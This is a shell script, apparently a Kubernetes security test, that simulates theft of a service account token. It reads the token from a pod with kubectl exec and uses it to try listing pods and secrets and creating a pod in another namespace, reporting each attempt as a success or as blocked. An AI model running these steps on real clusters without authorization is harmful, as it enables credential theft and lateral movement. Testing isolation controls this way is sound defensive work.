#!/bin/sh
set -eu

# Attempts to steal service account tokens and use them for lateral movement
# This simulates token theft and unauthorized API access

namespace="${1:-frontend}"
target_namespace="${2:-backend}"

echo "[ATTACK] Service Account Token Theft Attack"
echo "[INFO] Source namespace: $namespace"
echo "[INFO] Target namespace: $target_namespace"

# Step 1: Find pods in source namespace
pods=$(kubectl get pods -n "$namespace" -o jsonpath='{.items[*].metadata.name}' 2>/dev/null || echo "")
if [ -z "$pods" ]; then
    echo "[ERROR] No pods found in namespace $namespace"
    exit 1
fi

pod_name=$(echo "$pods" | awk '{print $1}')
echo "[INFO] Target pod: $pod_name"

# Step 2: Extract service account token
echo "[ATTACK] Extracting service account token..."
token=$(kubectl exec -n "$namespace" "$pod_name" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "")

if [ -n "$token" ]; then
    echo "[SUCCESS] Token extracted (first 50 chars): $(echo "$token" | head -c 50)..."
    
    # Step 3: Try to use token to access other namespaces
    echo "[ATTACK] Attempting lateral movement to namespace: $target_namespace"
    
    # Try to list pods in target namespace using stolen token
    kubectl get pods -n "$target_namespace" --token="$token" 2>/dev/null && \
        echo "[SUCCESS] Unauthorized access to $target_namespace namespace!" || \
        echo "[BLOCKED] Access denied to $target_namespace namespace"
    
    # Step 4: Try to access secrets
    echo "[ATTACK] Attempting to list secrets..."
    kubectl get secrets -n "$target_namespace" --token="$token" 2>/dev/null && \
        echo "[SUCCESS] Secrets enumeration successful!" || \
        echo "[BLOCKED] Secret access denied"
    
    # Step 5: Try to create resources
    echo "[ATTACK] Attempting to create unauthorized pod..."
    kubectl run test-pod-$(date +%s) -n "$target_namespace" --image=busybox --token="$token" --restart=Never --rm -i -- echo "test" 2>/dev/null && \
        echo "[SUCCESS] Unauthorized pod creation!" || \
        echo "[BLOCKED] Pod creation denied"
else
    echo "[FAILED] Could not extract service account token"
fi

echo "[COMPLETE] Token theft attack finished"

